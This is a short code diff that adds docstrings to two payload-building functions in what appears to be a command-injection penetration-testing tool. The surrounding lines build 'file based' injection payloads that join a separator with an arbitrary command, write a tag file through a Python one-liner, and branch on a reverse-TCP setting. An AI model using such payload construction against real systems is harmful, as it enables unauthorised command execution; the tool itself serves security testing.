@@ -23,6 +23,9 @@ import os
 import sys
 import src.core.setting.setting as settings
 def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
+  """
+  A function that defines file based shell altering payloads.
+  """
   if settings.TARGET_OS == settings.OS.WINDOWS or True:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
     payload = ("%20" +
@@ -48,6 +51,9 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 
 
 def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
+  """
+  A function that defines file based cmd altering payloads.
+  """
   if settings.TARGET_OS == settings.OS.WINDOWS or True:
     if settings.REVERSE_TCP:
       payload = (separator + cmd + settings.SINGLE_WHITESPACE
